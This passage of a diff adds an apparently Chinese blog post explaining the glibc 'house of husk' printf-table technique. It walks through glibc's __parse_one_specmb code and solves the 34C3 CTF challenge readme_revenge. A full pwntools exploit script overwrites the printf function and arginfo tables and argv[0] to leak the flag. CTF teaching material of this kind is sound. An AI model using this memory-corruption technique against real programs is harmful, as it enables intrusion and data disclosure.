+</span></span><span class="line"><span class="cl">      <span class="cm">/* Parse the format specifier.  */</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#ifdef COMPILE_WPRINTF
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>      <span class="n">nargs</span> <span class="o">+=</span> <span class="nf">__parse_one_specwc</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">nargs</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">specs</span><span class="p">[</span><span class="n">nspecs</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">max_ref_arg</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#else
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>      <span class="n">nargs</span> <span class="o">+=</span> <span class="nf">__parse_one_specmb</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">nargs</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">specs</span><span class="p">[</span><span class="n">nspecs</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">max_ref_arg</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif</span><span class="c1">//调用__parse_one_specmb
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Determine the number of arguments the format string consumes.  */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">nargs</span> <span class="o">=</span> <span class="nf">MAX</span> <span class="p">(</span><span class="n">nargs</span><span class="p">,</span> <span class="n">max_ref_arg</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="__parse_one_specmb-anyaddr">__parse_one_specmb-&gt;anyaddr
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#ifdef COMPILE_WPRINTF
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nf">__parse_one_specwc</span> <span class="p">(</span><span class="k">const</span> <span class="n">UCHAR_T</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">posn</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="k">struct</span> <span class="n">printf_spec</span> <span class="o">*</span><span class="n">spec</span><span class="p">,</span> <span class="kt">size_t</span> <span class="o">*</span><span class="n">max_ref_arg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#else
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nf">__parse_one_specmb</span> <span class="p">(</span><span class="k">const</span> <span class="n">UCHAR_T</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">posn</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="k">struct</span> <span class="n">printf_spec</span> <span class="o">*</span><span class="n">spec</span><span class="p">,</span> <span class="kt">size_t</span> <span class="o">*</span><span class="n">max_ref_arg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">n</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">nargs</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Skip the &#39;%&#39;.  */</span>
+</span></span><span class="line"><span class="cl">  <span class="o">++</span><span class="n">format</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">-----------------------------------</span><span class="err">关键代码</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">__builtin_expect</span> <span class="p">(</span><span class="n">__printf_modifier_table</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="o">||</span> <span class="n">__printf_modifier_table</span><span class="p">[</span><span class="o">*</span><span class="n">format</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span>
+</span></span><span class="line"><span class="cl">    <span class="o">||</span> <span class="nf">HANDLE_REGISTERED_MODIFIER</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">format</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">spec</span><span class="o">-&gt;</span><span class="n">info</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">__builtin_expect</span> <span class="p">(</span><span class="n">__printf_function_table</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="o">||</span> <span class="n">spec</span><span class="o">-&gt;</span><span class="n">info</span><span class="p">.</span><span class="n">spec</span> <span class="o">&gt;</span> <span class="n">UCHAR_MAX</span>
+</span></span><span class="line"><span class="cl">    <span class="o">||</span> <span class="n">__printf_arginfo_table</span><span class="p">[</span><span class="n">spec</span><span class="o">-&gt;</span><span class="n">info</span><span class="p">.</span><span class="n">spec</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* We don&#39;t try to get the types for all arguments if the format
+</span></span></span><span class="line"><span class="cl"><span class="cm">uses more than one.  The normal case is covered though.  If
+</span></span></span><span class="line"><span class="cl"><span class="cm">the call returns -1 we continue with the normal specifiers.  */</span>
+</span></span><span class="line"><span class="cl">    <span class="o">||</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="p">(</span><span class="n">spec</span><span class="o">-&gt;</span><span class="n">ndata_args</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">__printf_arginfo_table</span><span class="p">[</span><span class="n">spec</span><span class="o">-&gt;</span><span class="n">info</span><span class="p">.</span><span class="n">spec</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">           <span class="p">(</span><span class="o">&amp;</span><span class="n">spec</span><span class="o">-&gt;</span><span class="n">info</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">spec</span><span class="o">-&gt;</span><span class="n">data_arg_type</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&amp;</span><span class="n">spec</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="34c3ctf-readme_revenge">34c3CTF readme_revenge
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// edx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// ecx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// r8d
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// r9d
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">_isoc99_scanf</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">I010s</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">name</span><span class="p">,</span> <span class="p">(</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">envp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="s">&#34;Hi, %s. Bye.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">name</span><span class="p">,</span> <span class="n">v3</span><span class="p">,</span> <span class="n">v4</span><span class="p">,</span> <span class="n">v5</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>程序是静态编译的，flag直接储存在data段,且house_of_husk相关的俩个table地址均比name高，可以修改<font style="color:rgb(36, 41, 47);">__printf_function_table非空，__printf_arginfo_table为任意地址A满足*(A+8*0x73)=_stack_chk_fail_local地址</font></p>
+<p><font style="color:rgb(36, 41, 47);">最后把__libc_argv[0]地址改为flag地址</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">调用</span><span class="n">_stack_chk_fail_local时</span> <span class="err">会打印出</span> <span class="n">__libc_argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="err">指向的字符串</span>
+</span></span><span class="line"><span class="cl"><span class="err">该题中</span> <span class="n">__libc_argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="err">地址也比</span><span class="n">name高</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/image/husk/husk.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="1"
+	
+	
+></p>
+<p>只修改上述两个table会触发__parse_one_specmb中的下面代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">__builtin_expect</span> <span class="p">(</span><span class="n">__printf_modifier_table</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="o">||</span> <span class="n">__printf_modifier_table</span><span class="p">[</span><span class="o">*</span><span class="n">format</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span>
+</span></span><span class="line"><span class="cl">    <span class="o">||</span> <span class="nf">HANDLE_REGISTERED_MODIFIER</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">format</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">spec</span><span class="o">-&gt;</span><span class="n">info</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>需要控制__printf_modifier_table为空，__printf_modifier_table地址为<font style="color:rgb(36, 41, 47);">__printf_function_table地址+8</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#%s is 0x73</span>
+</span></span><span class="line"><span class="cl"><span class="n">arg_table</span><span class="o">=</span><span class="mh">0x6b7aa8</span>    <span class="c1">#distance fun_table 0x80</span>
+</span></span><span class="line"><span class="cl"><span class="n">fun_table</span><span class="o">=</span><span class="mh">0x6b7a28</span><span class="c1">#distance 0x648</span>
+</span></span><span class="line"><span class="cl"><span class="n">name</span><span class="o">=</span><span class="mh">0x6B73E0</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="mh">0x6b4040</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#__printf_modifier_table 位于 __printf_function_table 地址加 8 的位置</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_argv</span><span class="o">=</span><span class="mh">0x6b7980</span> <span class="c1">#distance  0x5a0</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#__stack_chk_fail_local</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak</span><span class="o">=</span><span class="mh">0x4359B0</span>
+</span></span><span class="line"><span class="cl"><span class="n">pay</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x598</span>
+</span></span><span class="line"><span class="cl"><span class="n">pay</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="c1">#libc_argv[0]</span>
+</span></span><span class="line"><span class="cl"><span class="n">pay</span><span class="o">+=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x648</span><span class="o">-</span><span class="mh">0x5a0</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="c1">#fun_table</span>
+</span></span><span class="line"><span class="cl"><span class="n">pay</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="c1">#__printf_modifier_table</span>
+</span></span><span class="line"><span class="cl"><span class="n">pay</span><span class="o">+=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x70</span>
+</span></span><span class="line"><span class="cl"><span class="n">pay</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">arg_table</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pay</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mh">0x72</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">&#39;b *0x400A5C&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/pwn/">Pwn</a>
+        
+            <a href="/tags/house%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/">House系列学习</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/house-of-stormbuu-0ctf_2018_heapstorm2/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/House_of_storm.jpg" loading="lazy" data-key="" data-hash="/image/House_of_storm.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">House of storm&amp;&amp;[BUU] 0ctf_2018_heapstorm2</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/house-of-forcegyctf_2020_force/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/House_of_force.jpg" loading="lazy" data-key="" data-hash="/image/House_of_force.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">House of force&amp;&amp;gyctf_2020_force</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/xswctf2025%E5%88%9D%E8%B5%9Bpwn-wp/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/XSWCTF_2.jpg" loading="lazy" data-key="" data-hash="/image/XSWCTF_2.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">XSWCTF2025初赛Pwn wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/bss%E6%AE%B5%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/bssfmt.jpg" loading="lazy" data-key="" data-hash="/image/bssfmt.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">bss段上格式化字符串漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/snprintf%E5%87%BD%E6%95%B0fmt%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/fuguang.jpg" loading="lazy" data-key="" data-hash="/image/fuguang.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">s[n]printf函数fmt漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 chang
+    </section>
+    
+    <section class="powerby">
+        
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.a2bdfcd44ef572203220652568b318b0d339e1b66627df894cad45601e4caa56.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<style>
+  body {
+     
+    background: url("/background/Ai.jpg") no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+     
+    margin: 0;  
+    min-height: 100vh;  
+  }
+
+ 
+  .container {
+    position: relative;
+  }
+  .container::before {
+    content: "";
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #fda2e363; 
+    z-index: -1; 
+  }  
+
+
+
+
+  
+
+
+</style>
+<script src="/background/sakura.js"></script>
+
+
+
+<script defer src="https://cn.vercount.one/js"></script>
+
+    </body>
+</html>
